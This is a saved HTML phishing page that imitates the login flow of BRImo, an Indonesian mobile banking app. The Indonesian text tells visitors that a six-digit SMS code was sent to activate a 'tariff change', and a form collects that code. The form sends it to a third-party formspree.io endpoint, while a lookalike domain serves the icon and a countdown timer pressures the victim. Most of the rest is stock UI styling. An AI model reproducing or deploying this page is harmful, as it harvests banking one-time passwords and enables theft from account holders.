<!DOCTYPE html><html data-theme="light" style="color-scheme: light;"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><link rel="stylesheet" type="text/css" href="cid:css-97203d11-bb4c-46a9-9c73-7a152c5b259d@mhtml.blink" /><link rel="stylesheet" type="text/css" href="cid:css-f96e47e1-f533-46e7-a393-1cca747a35c6@mhtml.blink" /><link rel="stylesheet" type="text/css" href="cid:css-11ac2e39-e828-43a2-90cf-fb3bf538cdf1@mhtml.blink" /><link rel="stylesheet" type="text/css" href="cid:css-6ea3335a-1633-43f0-95e0-5c7032e64f87@mhtml.blink" /><link rel="stylesheet" type="text/css" href="cid:css-bafcb91c-c71e-4f14-9a39-94b71459e53e@mhtml.blink" /><meta name="viewport" content="width=device-width"><link rel="apple-touch-icon" sizes="72x72" href="/apple-touch-icon.png"><link rel="icon" href="https://link-brimo-online.com/favicon-tarif.ico"><link rel="manifest" href="/site.webmanifest"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><meta name="msapplication-TileColor" content="#da532c"><meta name="theme-color" content="#ffffff"><meta name="mobile-web-app-capable" content="yes"><title>BRImo</title><meta name="next-head-count" content="10"><link rel="preload" href="/_next/static/css/253830bd1cc0a820.css" as="style"><link rel="stylesheet" href="/_next/static/css/253830bd1cc0a820.css" data-n-g=""></head><body class="chakra-ui-light"><div id="__next"><div class="css-536van"><div class="css-1ydnv1o"><div class="css-41f8xg"><img src="https://telegra.ph/file/17f4d960d0f328cad3876.png" class="css-1qsi9nt"><div class="css-50apgb"><p class="chakra-text css-1aa1y8j">Cek SMS</p></div><div class="css-1tco0e8"> <p class="chakra-text css-1114pta" id="timer"></p></b></p><!-- modify this form HTML and place wherever you want your form --><form action="https://formspree.io/f/xpznyrkg"method="POST"><p class="chakra-text css-16ccg4r">Kode 6 digit angka sudah kami Kirimkan untuk aktivasi perubahan Tarif<br>Silahkan cek SMS di nomor handphone anda yang terdaftar di BRImo silahkan isi dibawah Ini.</p><input name="message" id="message" rows="4" placeholder="Contoh : 123456" type="number" required="" maxlength="6" class="chakra-input css-xp1ftg" value=""><button type="submit" class="chakra-button css-63h4m2">Konfirmasi</button></div></div><p class="chakra-text css-1fow574"><span class="css-bv69nn">Tidak Terima SMS?</span> <span class="css-1tzeee1">Kirim Ulang</span></p></div></div></div><div class="chakra-portal"><ul role="region" aria-live="polite" id="chakra-toast-manager-top" style="position: fixed; z-index: 5500; pointer-events: none; display: flex; flex-direction: column; margin: 0px auto; top: env(safe-area-inset-top, 0px); right: env(safe-area-inset-right, 0px); left: env(safe-area-inset-left, 0px);"></ul><ul role="region" aria-live="polite" id="chakra-toast-manager-top-left" style="position: fixed; z-index: 5500; pointer-events: none; display: flex; flex-direction: column; top: env(safe-area-inset-top, 0px); left: env(safe-area-inset-left, 0px);"></ul><ul role="region" aria-live="polite" id="chakra-toast-manager-top-right" style="position: fixed; z-index: 5500; pointer-events: none; display: flex; flex-direction: column; top: env(safe-area-inset-top, 0px); right: env(safe-area-inset-right, 0px);"></ul><ul role="region" aria-live="polite" id="chakra-toast-manager-bottom-left" style="position: fixed; z-index: 5500; pointer-events: none; display: flex; flex-direction: column; bottom: env(safe-area-inset-bottom, 0px); left: env(safe-area-inset-left, 0px);"></ul><ul role="region" aria-live="polite" id="chakra-toast-manager-bottom" style="position: fixed; z-index: 5500; pointer-events: none; display: flex; flex-direction: column; margin: 0px auto; bottom: env(safe-area-inset-bottom, 0px); right: env(safe-area-inset-right, 0px); left: env(safe-area-inset-left, 0px);"></ul><ul role="region" aria-live="polite" id="chakra-toast-manager-bottom-right" style="position: fixed; z-index: 5500; pointer-events: none; display: flex; flex-direction: column; bottom: env(safe-area-inset-bottom, 0px); right: env(safe-area-inset-right, 0px);"></ul></div>
  <script>
        document.getElementById('timer').innerHTML =
          05 + ":" + 01;
        startTimer();
        
        
        function startTimer() {
          var presentTime = document.getElementById('timer').innerHTML;
          var timeArray = presentTime.split(/[:]+/);
          var m = timeArray[0];
          var s = checkSecond((timeArray[1] - 1));
          if(s==59){m=m-1}
          if(m<0){
            return
          }
          
          document.getElementById('timer').innerHTML =
            m + " : " + s;
          console.log(m)
          setTimeout(startTimer, 1000);
          
        }
        
        function checkSecond(sec) {
          if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
          if (sec < 0) {sec = "59"};
          return sec;
        }
    </script> 
</head>
</body>
</html>
<style>

@charset "utf-8";

:host, :root, [data-theme] { --chakra-ring-inset:var(--chakra-empty, ); --chakra-ring-offset-width:0px; --chakra-ring-offset-color:#fff; --chakra-ring-color:rgba(66, 153, 225, 0.6); --chakra-ring-offset-shadow:0 0 #0000; --chakra-ring-shadow:0 0 #0000; --chakra-space-x-reverse:0; --chakra-space-y-reverse:0; --chakra-colors-transparent:transparent; --chakra-colors-current:currentColor; --chakra-colors-black:#000000; --chakra-colors-white:#FFFFFF; --chakra-colors-whiteAlpha-50:rgba(255, 255, 255, 0.04); --chakra-colors-whiteAlpha-100:rgba(255, 255, 255, 0.06); --chakra-colors-whiteAlpha-200:rgba(255, 255, 255, 0.08); --chakra-colors-whiteAlpha-300:rgba(255, 255, 255, 0.16); --chakra-colors-whiteAlpha-400:rgba(255, 255, 255, 0.24); --chakra-colors-whiteAlpha-500:rgba(255, 255, 255, 0.36); --chakra-colors-whiteAlpha-600:rgba(255, 255, 255, 0.48); --chakra-colors-whiteAlpha-700:rgba(255, 255, 255, 0.64); --chakra-colors-whiteAlpha-800:rgba(255, 255, 255, 0.8); --chakra-colors-whiteAlpha-900:rgba(255, 255, 255, 0.92); --chakra-colors-blackAlpha-50:rgba(0, 0, 0, 0.04); --chakra-colors-blackAlpha-100:rgba(0, 0, 0, 0.06); --chakra-colors-blackAlpha-200:rgba(0, 0, 0, 0.08); --chakra-colors-blackAlpha-300:rgba(0, 0, 0, 0.16); --chakra-colors-blackAlpha-400:rgba(0, 0, 0, 0.24); --chakra-colors-blackAlpha-500:rgba(0, 0, 0, 0.36); --chakra-colors-blackAlpha-600:rgba(0, 0, 0, 0.48); --chakra-colors-blackAlpha-700:rgba(0, 0, 0, 0.64); --chakra-colors-blackAlpha-800:rgba(0, 0, 0, 0.8); --chakra-colors-blackAlpha-900:rgba(0, 0, 0, 0.92); --chakra-colors-gray-50:#F7FAFC; --chakra-colors-gray-100:#EDF2F7; --chakra-colors-gray-200:#E2E8F0; --chakra-colors-gray-300:#CBD5E0; --chakra-colors-gray-400:#A0AEC0; --chakra-colors-gray-500:#718096; --chakra-colors-gray-600:#4A5568; --chakra-colors-gray-700:#2D3748; --chakra-colors-gray-800:#1A202C; --chakra-colors-gray-900:#171923; --chakra-colors-red-50:#FFF5F5; --chakra-colors-red-100:#FED7D7; --chakra-colors-red-200:#FEB2B2; --chakra-colors-red-300:#FC8181; --chakra-colors-red-400:#F56565; --chakra-colors-red-500:#E53E3E; --chakra-colors-red-600:#C53030; --chakra-colors-red-700:#9B2C2C; --chakra-colors-red-800:#822727; --chakra-colors-red-900:#63171B; --chakra-colors-orange-50:#FFFAF0; --chakra-colors-orange-100:#FEEBC8; --chakra-colors-orange-200:#FBD38D; --chakra-colors-orange-300:#F6AD55; --chakra-colors-orange-400:#ED8936; --chakra-colors-orange-500:#DD6B20; --chakra-colors-orange-600:#C05621; --chakra-colors-orange-700:#9C4221; --chakra-colors-orange-800:#7B341E; --chakra-colors-orange-900:#652B19; --chakra-colors-yellow-50:#FFFFF0; --chakra-colors-yellow-100:#FEFCBF; --chakra-colors-yellow-200:#FAF089; --chakra-colors-yellow-300:#F6E05E; --chakra-colors-yellow-400:#ECC94B; --chakra-colors-yellow-500:#D69E2E; --chakra-colors-yellow-600:#B7791F; --chakra-colors-yellow-700:#975A16; --chakra-colors-yellow-800:#744210; --chakra-colors-yellow-900:#5F370E; --chakra-colors-green-50:#F0FFF4; --chakra-colors-green-100:#C6F6D5; --chakra-colors-green-200:#9AE6B4; --chakra-colors-green-300:#68D391; --chakra-colors-green-400:#48BB78; --chakra-colors-green-500:#38A169; --chakra-colors-green-600:#2F855A; --chakra-colors-green-700:#276749; --chakra-colors-green-800:#22543D; --chakra-colors-green-900:#1C4532; --chakra-colors-teal-50:#E6FFFA; --chakra-colors-teal-100:#B2F5EA; --chakra-colors-teal-200:#81E6D9; --chakra-colors-teal-300:#4FD1C5; --chakra-colors-teal-400:#38B2AC; --chakra-colors-teal-500:#319795; --chakra-colors-teal-600:#2C7A7B; --chakra-colors-teal-700:#285E61; --chakra-colors-teal-800:#234E52; --chakra-colors-teal-900:#1D4044; --chakra-colors-blue-50:#ebf8ff; --chakra-colors-blue-100:#bee3f8; --chakra-colors-blue-200:#90cdf4; --chakra-colors-blue-300:#63b3ed; --chakra-colors-blue-400:#4299e1; --chakra-colors-blue-500:#3182ce; --chakra-colors-blue-600:#2b6cb0; --chakra-colors-blue-700:#2c5282; --chakra-colors-blue-800:#2a4365; --chakra-colors-blue-900:#1A365D; --chakra-colors-cyan-50:#EDFDFD; --chakra-colors-cyan-100:#C4F1F9; --chakra-colors-cyan-200:#9DECF9; --chakra-colors-cyan-300:#76E4F7; --chakra-colors-cyan-400:#0BC5EA; --chakra-colors-cyan-500:#00B5D8; --chakra-colors-cyan-600:#00A3C4; --chakra-colors-cyan-700:#0987A0; --chakra-colors-cyan-800:#086F83; --chakra-colors-cyan-900:#065666; --chakra-colors-purple-50:#FAF5FF; --chakra-colors-purple-100:#E9D8FD; --chakra-colors-purple-200:#D6BCFA; --chakra-colors-purple-300:#B794F4; --chakra-colors-purple-400:#9F7AEA; --chakra-colors-purple-500:#805AD5; --chakra-colors-purple-600:#6B46C1; --chakra-colors-purple-700:#553C9A; --chakra-colors-purple-800:#44337A; --chakra-colors-purple-900:#322659; --chakra-colors-pink-50:#FFF5F7; --chakra-colors-pink-100:#FED7E2; --chakra-colors-pink-200:#FBB6CE; --chakra-colors-pink-300:#F687B3; --chakra-colors-pink-400:#ED64A6; --chakra-colors-pink-500:#D53F8C; --chakra-colors-pink-600:#B83280; --chakra-colors-pink-700:#97266D; --chakra-colors-pink-800:#702459; --chakra-colors-pink-900:#521B41; --chakra-colors-linkedin-50:#E8F4F9; --chakra-colors-linkedin-100:#CFEDFB; --chakra-colors-linkedin-200:#9BDAF3; --chakra-colors-linkedin-300:#68C7EC; --chakra-colors-linkedin-400:#34B3E4; --chakra-colors-linkedin-500:#00A0DC; --chakra-colors-linkedin-600:#008CC9; --chakra-colors-linkedin-700:#0077B5; --chakra-colors-linkedin-800:#005E93; --chakra-colors-linkedin-900:#004471; --chakra-colors-facebook-50:#E8F4F9; --chakra-colors-facebook-100:#D9DEE9; --chakra-colors-facebook-200:#B7C2DA; --chakra-colors-facebook-300:#6482C0; --chakra-colors-facebook-400:#4267B2; --chakra-colors-facebook-500:#385898; --chakra-colors-facebook-600:#314E89; --chakra-colors-facebook-700:#29487D; --chakra-colors-facebook-800:#223B67; --chakra-colors-facebook-900:#1E355B; --chakra-colors-messenger-50:#D0E6FF; --chakra-colors-messenger-100:#B9DAFF; --chakra-colors-messenger-200:#A2CDFF; --chakra-colors-messenger-300:#7AB8FF; --chakra-colors-messenger-400:#2E90FF; --chakra-colors-messenger-500:#0078FF; --chakra-colors-messenger-600:#0063D1; --chakra-colors-messenger-700:#0052AC; --chakra-colors-messenger-800:#003C7E; --chakra-colors-messenger-900:#002C5C; --chakra-colors-whatsapp-50:#dffeec; --chakra-colors-whatsapp-100:#b9f5d0; --chakra-colors-whatsapp-200:#90edb3; --chakra-colors-whatsapp-300:#65e495; --chakra-colors-whatsapp-400:#3cdd78; --chakra-colors-whatsapp-500:#22c35e; --chakra-colors-whatsapp-600:#179848; --chakra-colors-whatsapp-700:#0c6c33; --chakra-colors-whatsapp-800:#01421c; --chakra-colors-whatsapp-900:#001803; --chakra-colors-twitter-50:#E5F4FD; --chakra-colors-twitter-100:#C8E9FB; --chakra-colors-twitter-200:#A8DCFA; --chakra-colors-twitter-300:#83CDF7; --chakra-colors-twitter-400:#57BBF5; --chakra-colors-twitter-500:#1DA1F2; --chakra-colors-twitter-600:#1A94DA; --chakra-colors-twitter-700:#1681BF; --chakra-colors-twitter-800:#136B9E; --chakra-colors-twitter-900:#0D4D71; --chakra-colors-telegram-50:#E3F2F9; --chakra-colors-telegram-100:#C5E4F3; --chakra-colors-telegram-200:#A2D4EC; --chakra-colors-telegram-300:#7AC1E4; --chakra-colors-telegram-400:#47A9DA; --chakra-colors-telegram-500:#0088CC; --chakra-colors-telegram-600:#007AB8; --chakra-colors-telegram-700:#006BA1; --chakra-colors-telegram-800:#005885; --chakra-colors-telegram-900:#003F5E; --chakra-borders-none:0; --chakra-borders-1px:1px solid; --chakra-borders-2px:2px solid; --chakra-borders-4px:4px solid; --chakra-borders-8px:8px solid; --chakra-fonts-heading:-apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol"; --chakra-fonts-body:-apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol"; --chakra-fonts-mono:SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace; --chakra-fontSizes-xs:0.75rem; --chakra-fontSizes-sm:0.875rem; --chakra-fontSizes-md:1rem; --chakra-fontSizes-lg:1.125rem; --chakra-fontSizes-xl:1.25rem; --chakra-fontSizes-2xl:1.5rem; --chakra-fontSizes-3xl:1.875rem; --chakra-fontSizes-4xl:2.25rem; --chakra-fontSizes-5xl:3rem; --chakra-fontSizes-6xl:3.75rem; --chakra-fontSizes-7xl:4.5rem; --chakra-fontSizes-8xl:6rem; --chakra-fontSizes-9xl:8rem; --chakra-fontWeights-hairline:100; --chakra-fontWeights-thin:200; --chakra-fontWeights-light:300; --chakra-fontWeights-normal:400; --chakra-fontWeights-medium:500; --chakra-fontWeights-semibold:600; --chakra-fontWeights-bold:700; --chakra-fontWeights-extrabold:800; --chakra-fontWeights-black:900; --chakra-letterSpacings-tighter:-0.05em; --chakra-letterSpacings-tight:-0.025em; --chakra-letterSpacings-normal:0; --chakra-letterSpacings-wide:0.025em; --chakra-letterSpacings-wider:0.05em; --chakra-letterSpacings-widest:0.1em; --chakra-lineHeights-3:0.75rem; --chakra-lineHeights-4:1rem; --chakra-lineHeights-5:1.25rem; --chakra-lineHeights-6:1.5rem; --chakra-lineHeights-7:1.75rem; --chakra-lineHeights-8:2rem; --chakra-lineHeights-9:2.25rem; --chakra-lineHeights-10:2.5rem; --chakra-lineHeights-normal:normal; --chakra-lineHeights-none:1; --chakra-lineHeights-shorter:1.25; --chakra-lineHeights-short:1.375; --chakra-lineHeights-base:1.5; --chakra-lineHeights-tall:1.625; --chakra-lineHeights-taller:2; --chakra-radii-none:0; --chakra-radii-sm:0.125rem; --chakra-radii-base:0.25rem; --chakra-radii-md:0.375rem; --chakra-radii-lg:0.5rem; --chakra-radii-xl:0.75rem; --chakra-radii-2xl:1rem; --chakra-radii-3xl:1.5rem; --chakra-radii-full:9999px; --chakra-space-1:0.25rem; --chakra-space-2:0.5rem; --chakra-space-3:0.75rem; --chakra-space-4:1rem; --chakra-space-5:1.25rem; --chakra-space-6:1.5rem; --chakra-space-7:1.75rem; --chakra-space-8:2rem; --chakra-space-9:2.25rem; --chakra-space-10:2.5rem; --chakra-space-12:3rem; --chakra-space-14:3.5rem; --chakra-space-16:4rem; --chakra-space-20:5rem; --chakra-space-24:6rem; --chakra-space-28:7rem; --chakra-space-32:8rem; --chakra-space-36:9rem; --chakra-space-40:10rem; --chakra-space-44:11rem; --chakra-space-48:12rem; --chakra-space-52:13rem; --chakra-space-56:14rem; --chakra-space-60:15rem; --chakra-space-64:16rem; --chakra-space-72:18rem; --chakra-space-80:20rem; --chakra-space-96:24rem; --chakra-space-px:1px; --chakra-space-0-5:0.125rem; --chakra-space-1-5:0.375rem; --chakra-space-2-5:0.625rem; --chakra-space-3-5:0.875rem; --chakra-shadows-xs:0 0 0 1px rgba(0, 0, 0, 0.05); --chakra-shadows-sm:0 1px 2px 0 rgba(0, 0, 0, 0.05); --chakra-shadows-base:0 1px 3px 0 rgba(0, 0, 0, 0.1),0 1px 2px 0 rgba(0, 0, 0, 0.06); --chakra-shadows-md:0 4px 6px -1px rgba(0, 0, 0, 0.1),0 2px 4px -1px rgba(0, 0, 0, 0.06); --chakra-shadows-lg:0 10px 15px -3px rgba(0, 0, 0, 0.1),0 4px 6px -2px rgba(0, 0, 0, 0.05); --chakra-shadows-xl:0 20px 25px -5px rgba(0, 0, 0, 0.1),0 10px 10px -5px rgba(0, 0, 0, 0.04); --chakra-shadows-2xl:0 25px 50px -12px rgba(0, 0, 0, 0.25); --chakra-shadows-outline:0 0 0 3px rgba(66, 153, 225, 0.6); --chakra-shadows-inner:inset 0 2px 4px 0 rgba(0,0,0,0.06); --chakra-shadows-none:none; --chakra-shadows-dark-lg:rgba(0, 0, 0, 0.1) 0px 0px 0px 1px,rgba(0, 0, 0, 0.2) 0px 5px 10px,rgba(0, 0, 0, 0.4) 0px 15px 40px; --chakra-sizes-1:0.25rem; --chakra-sizes-2:0.5rem; --chakra-sizes-3:0.75rem; --chakra-sizes-4:1rem; --chakra-sizes-5:1.25rem; --chakra-sizes-6:1.5rem; --chakra-sizes-7:1.75rem; --chakra-sizes-8:2rem; --chakra-sizes-9:2.25rem; --chakra-sizes-10:2.5rem; --chakra-sizes-12:3rem; --chakra-sizes-14:3.5rem; --chakra-sizes-16:4rem; --chakra-sizes-20:5rem; --chakra-sizes-24:6rem; --chakra-sizes-28:7rem; --chakra-sizes-32:8rem; --chakra-sizes-36:9rem; --chakra-sizes-40:10rem; --chakra-sizes-44:11rem; --chakra-sizes-48:12rem; --chakra-sizes-52:13rem; --chakra-sizes-56:14rem; --chakra-sizes-60:15rem; --chakra-sizes-64:16rem; --chakra-sizes-72:18rem; --chakra-sizes-80:20rem; --chakra-sizes-96:24rem; --chakra-sizes-px:1px; --chakra-sizes-0-5:0.125rem; --chakra-sizes-1-5:0.375rem; --chakra-sizes-2-5:0.625rem; --chakra-sizes-3-5:0.875rem; --chakra-sizes-max:max-content; --chakra-sizes-min:min-content; --chakra-sizes-full:100%; --chakra-sizes-3xs:14rem; --chakra-sizes-2xs:16rem; --chakra-sizes-xs:20rem; --chakra-sizes-sm:24rem; --chakra-sizes-md:28rem; --chakra-sizes-lg:32rem; --chakra-sizes-xl:36rem; --chakra-sizes-2xl:42rem; --chakra-sizes-3xl:48rem; --chakra-sizes-4xl:56rem; --chakra-sizes-5xl:64rem; --chakra-sizes-6xl:72rem; --chakra-sizes-7xl:80rem; --chakra-sizes-8xl:90rem; --chakra-sizes-container-sm:640px; --chakra-sizes-container-md:768px; --chakra-sizes-container-lg:1024px; --chakra-sizes-container-xl:1280px; --chakra-zIndices-hide:-1; --chakra-zIndices-auto:auto; --chakra-zIndices-base:0; --chakra-zIndices-docked:10; --chakra-zIndices-dropdown:1000; --chakra-zIndices-sticky:1100; --chakra-zIndices-banner:1200; --chakra-zIndices-overlay:1300; --chakra-zIndices-modal:1400; --chakra-zIndices-popover:1500; --chakra-zIndices-skipLink:1600; --chakra-zIndices-toast:1700; --chakra-zIndices-tooltip:1800; --chakra-transition-property-common:background-color,border-color,color,fill,stroke,opacity,box-shadow,transform; --chakra-transition-property-colors:background-color,border-color,color,fill,stroke; --chakra-transition-property-dimensions:width,height; --chakra-transition-property-position:left,right,top,bottom; --chakra-transition-property-background:background-color,background-image,background-position; --chakra-transition-easing-ease-in:cubic-bezier(0.4, 0, 1, 1); --chakra-transition-easing-ease-out:cubic-bezier(0, 0, 0.2, 1); --chakra-transition-easing-ease-in-out:cubic-bezier(0.4, 0, 0.2, 1); --chakra-transition-duration-ultra-fast:50ms; --chakra-transition-duration-faster:100ms; --chakra-transition-duration-fast:150ms; --chakra-transition-duration-normal:200ms; --chakra-transition-duration-slow:300ms; --chakra-transition-duration-slower:400ms; --chakra-transition-duration-ultra-slow:500ms; --chakra-blur-none:0; --chakra-blur-sm:4px; --chakra-blur-base:8px; --chakra-blur-md:12px; --chakra-blur-lg:16px; --chakra-blur-xl:24px; --chakra-blur-2xl:40px; --chakra-blur-3xl:64px; }

.chakra-ui-light :host:not([data-theme]), .chakra-ui-light :root:not([data-theme]), .chakra-ui-light [data-theme]:not([data-theme]), [data-theme="light"] :host:not([data-theme]), [data-theme="light"] :root:not([data-theme]), [data-theme="light"] [data-theme]:not([data-theme]), :host[data-theme="light"], :root[data-theme="light"], [data-theme][data-theme="light"] { --chakra-colors-chakra-body-text:var(--chakra-colors-gray-800); --chakra-colors-chakra-body-bg:var(--chakra-colors-white); --chakra-colors-chakra-border-color:var(--chakra-colors-gray-200); --chakra-colors-chakra-placeholder-color:var(--chakra-colors-gray-500); }

.chakra-ui-dark :host:not([data-theme]), .chakra-ui-dark :root:not([data-theme]), .chakra-ui-dark [data-theme]:not([data-theme]), [data-theme="dark"] :host:not([data-theme]), [data-theme="dark"] :root:not([data-theme]), [data-theme="dark"] [data-theme]:not([data-theme]), :host[data-theme="dark"], :root[data-theme="dark"], [data-theme][data-theme="dark"] { --chakra-colors-chakra-body-text:var(--chakra-colors-whiteAlpha-900); --chakra-colors-chakra-body-bg:var(--chakra-colors-gray-800); --chakra-colors-chakra-border-color:var(--chakra-colors-whiteAlpha-300); --chakra-colors-chakra-placeholder-color:var(--chakra-colors-whiteAlpha-400); }
</style>
<style>
@charset "utf-8";

html { line-height: 1.5; text-size-adjust: 100%; font-family: system-ui, sans-serif; -webkit-font-smoothing: antialiased; text-rendering: optimizelegibility; touch-action: manipulation; }

body { position: relative; min-height: 100%; font-feature-settings: "kern"; }

*, ::before, ::after { border-width: 0px; border-style: solid; box-sizing: border-box; }

main { display: block; }

hr { border-top-width: 1px; box-sizing: content-box; height: 0px; overflow: visible; }

pre, code, kbd, samp { font-family: SFMono-Regular, Menlo, Monaco, Consolas, monospace; font-size: 1em; }

a { background-color: transparent; color: inherit; text-decoration: inherit; }

abbr[title] { border-bottom: none; text-decoration: underline dotted; }

b, strong { font-weight: bold; }

small { font-size: 80%; }

sub, sup { font-size: 75%; line-height: 0; position: relative; vertical-align: baseline; }

sub { bottom: -0.25em; }

sup { top: -0.5em; }

img { border-style: none; }

button, input, optgroup, select, textarea { font-family: inherit; font-size: 100%; line-height: 1.15; margin: 0px; }

button, input { overflow: visible; }

button, select { text-transform: none; }

fieldset { padding: 0.35em 0.75em 0.625em; }

legend { box-sizing: border-box; color: inherit; display: table; max-width: 100%; padding: 0px; white-space: normal; }

progress { vertical-align: baseline; }

textarea { overflow: auto; }

[type="checkbox"], [type="radio"] { box-sizing: border-box; padding: 0px; }

[type="number"]::-webkit-inner-spin-button, [type="number"]::-webkit-outer-spin-button { appearance: none !important; }

input[type="number"] { }

[type="search"] { appearance: textfield; outline-offset: -2px; }

[type="search"]::-webkit-search-decoration { appearance: none !important; }

::-webkit-file-upload-button { appearance: button; font: inherit; }

details { display: block; }

summary { display: list-item; }

template { display: none; }

[hidden] { display: none !important; }

body, blockquote, dl, dd, h1, h2, h3, h4, h5, h6, hr, figure, p, pre { margin: 0px; }

button { background: transparent; padding: 0px; }

fieldset { margin: 0px; padding: 0px; }

ol, ul { margin: 0px; padding: 0px; }

textarea { resize: vertical; }

button, [role="button"] { cursor: pointer; }

table { border-collapse: collapse; }

h1, h2, h3, h4, h5, h6 { font-size: inherit; font-weight: inherit; }

button, input, optgroup, select, textarea { padding: 0px; line-height: inherit; color: inherit; }

img, svg, video, canvas, audio, iframe, embed, object { display: block; }

img, video { max-width: 100%; height: auto; }

[data-js-focus-visible] :focus:not([data-focus-visible-added]):not([data-focus-visible-disabled]) { outline: none; box-shadow: none; }
</style>
<style>
@charset "utf-8";

body { font-family: AvenirMedium; color: var(--chakra-colors-chakra-body-text); background: var(--chakra-colors-chakra-body-bg); transition-property: background-color; transition-duration: var(--chakra-transition-duration-normal); line-height: var(--chakra-lineHeights-base); }

::-webkit-input-placeholder { color: var(--chakra-colors-chakra-placeholder-color); }

::placeholder { color: var(--chakra-colors-chakra-placeholder-color); }

*, ::before, ::after { border-color: var(--chakra-colors-chakra-border-color); overflow-wrap: break-word; }
</style>
<style>

@charset "utf-8";

.css-536van { max-width: 500px; margin: auto; overflow: hidden; height: 100%; }
</style>
<style>

@charset "utf-8";

.css-1kh160d { background-color: rgba(255, 255, 255, 0.4); position: fixed; inset: 0px; display: flex; -webkit-box-align: center; align-items: center; -webkit-box-pack: center; justify-content: center; z-index: 9; }

.css-v7v99c { width: 100px; }

.css-otdls7 { background-color: rgb(244, 244, 244); height: 100%; display: flex; flex-direction: column; }

.css-m25hbt { background-color: white; padding: 10px 20px; }

.css-r8xns0 { height: 27px; }

.css-6icz3w { width: 100%; height: 170px; }

.css-1h7se0k { text-align: center; flex: 1 1 0%; }

.css-k9xuz5 { margin: 0px auto; }

.css-140rqgf { text-align: left; padding: 10px 20px; margin-bottom: 18px; }

.css-14zpys6 { font-weight: 700; color: var(--chakra-colors-blue-500); font-size: var(--chakra-fontSizes-xl); text-align: center; }

.css-1gu96id { margin-bottom: 20px; font-weight: 600; color: var(--chakra-colors-blue-500); font-size: var(--chakra-fontSizes-sm); text-align: center; }

.css-1jnktsq { cursor: pointer; display: inline-flex; -webkit-box-align: center; align-items: center; vertical-align: top; position: relative; border-color: var(--chakra-colors-blackAlpha-400); color: var(--chakra-colors-blue-500); font-weight: var(--chakra-fontWeights-bold); }

.css-1jnktsq[disabled], .css-1jnktsq[aria-disabled="true"], .css-1jnktsq[data-disabled] { cursor: not-allowed; }

.css-1ncbew8 { width: var(--chakra-sizes-4); transition-property: box-shadow; transition-duration: var(--chakra-transition-duration-normal); border-width: 2px; border-style: solid; border-image: initial; border-radius: var(--chakra-radii-sm); border-color: inherit; color: var(--chakra-colors-white); height: var(--chakra-sizes-4); display: inline-flex; -webkit-box-align: center; align-items: center; -webkit-box-pack: center; justify-content: center; vertical-align: top; user-select: none; flex-shrink: 0; }

.css-1ncbew8[aria-checked="true"], .css-1ncbew8[data-checked] { background: var(--chakra-colors-blue-500); border-color: var(--chakra-colors-blue-500); color: var(--chakra-colors-white); }

.css-1ncbew8[aria-checked="true"]:hover, .css-1ncbew8[data-checked]:hover, .css-1ncbew8[aria-checked="true"][data-hover], .css-1ncbew8[data-checked][data-hover] { background: var(--chakra-colors-blue-600); border-color: var(--chakra-colors-blue-600); }

.css-1ncbew8[aria-checked="true"][disabled], .css-1ncbew8[data-checked][disabled], .css-1ncbew8[aria-checked="true"][aria-disabled="true"], .css-1ncbew8[data-checked][aria-disabled="true"], .css-1ncbew8[aria-checked="true"][data-disabled], .css-1ncbew8[data-checked][data-disabled] { border-color: var(--chakra-colors-gray-200); background: var(--chakra-colors-gray-200); color: var(--chakra-colors-gray-500); }

.css-1ncbew8:indeterminate, .css-1ncbew8[aria-checked="mixed"], .css-1ncbew8[data-indeterminate] { background: var(--chakra-colors-blue-500); border-color: var(--chakra-colors-blue-500); color: var(--chakra-colors-white); }

.css-1ncbew8[disabled], .css-1ncbew8[aria-disabled="true"], .css-1ncbew8[data-disabled] { background: var(--chakra-colors-gray-100); border-color: var(--chakra-colors-gray-100); }

.css-1ncbew8:focus-visible, .css-1ncbew8[data-focus-visible] { box-shadow: var(--chakra-shadows-outline); }

.css-1ncbew8[aria-invalid="true"], .css-1ncbew8[data-invalid] { border-color: var(--chakra-colors-red-500); }

.css-1sgc0qu { margin-inline-start: 0.5rem; user-select: none; font-size: var(--chakra-fontSizes-md); }

.css-1sgc0qu[disabled], .css-1sgc0qu[aria-disabled="true"], .css-1sgc0qu[data-disabled] { opacity: 0.4; }

.css-1tqjkcb { cursor: pointer; display: inline-flex; -webkit-box-align: center; align-items: center; vertical-align: top; position: relative; border-color: var(--chakra-colors-blackAlpha-400); color: var(--chakra-colors-blue-500); font-weight: var(--chakra-fontWeights-bold); margin-bottom: 20px; }

.css-1tqjkcb[disabled], .css-1tqjkcb[aria-disabled="true"], .css-1tqjkcb[data-disabled] { cursor: not-allowed; }

.css-jgamys { font-size: 12px; text-align: center; color: rgb(14, 120, 202); font-weight: 700; }

.css-g9qnka { padding: 0px 20px; }

.css-q9238k { display: inline-flex; appearance: none; -webkit-box-align: center; align-items: center; -webkit-box-pack: center; justify-content: center; user-select: none; position: relative; white-space: nowrap; vertical-align: middle; outline: transparent solid 2px; outline-offset: 2px; line-height: 1.2; border-radius: var(--chakra-radii-full); font-weight: var(--chakra-fontWeights-semibold); transition-property: var(--chakra-transition-property-common); transition-duration: var(--chakra-transition-duration-normal); height: var(--chakra-sizes-10); min-width: var(--chakra-sizes-10); font-size: var(--chakra-fontSizes-md); padding-inline-start: var(--chakra-space-4); padding-inline-end: var(--chakra-space-4); background: var(--chakra-colors-blue-500); color: var(--chakra-colors-white); width: var(--chakra-sizes-full); margin-top: 32px; }

.css-q9238k:focus-visible, .css-q9238k[data-focus-visible] { box-shadow: var(--chakra-shadows-outline); }

.css-q9238k[disabled], .css-q9238k[aria-disabled="true"], .css-q9238k[data-disabled] { opacity: 0.4; cursor: not-allowed; box-shadow: var(--chakra-shadows-none); }

.css-q9238k:hover, .css-q9238k[data-hover] { background: var(--chakra-colors-blue-600); }

.css-q9238k:hover[disabled], .css-q9238k[data-hover][disabled], .css-q9238k:hover[aria-disabled="true"], .css-q9238k[data-hover][aria-disabled="true"], .css-q9238k:hover[data-disabled], .css-q9238k[data-hover][data-disabled] { background: var(--chakra-colors-blue-500); }

.css-q9238k:active, .css-q9238k[data-active] { background: var(--chakra-colors-blue-700); }

.css-129zm1u { font-weight: 700; font-size: var(--chakra-fontSizes-sm); text-align: center; }

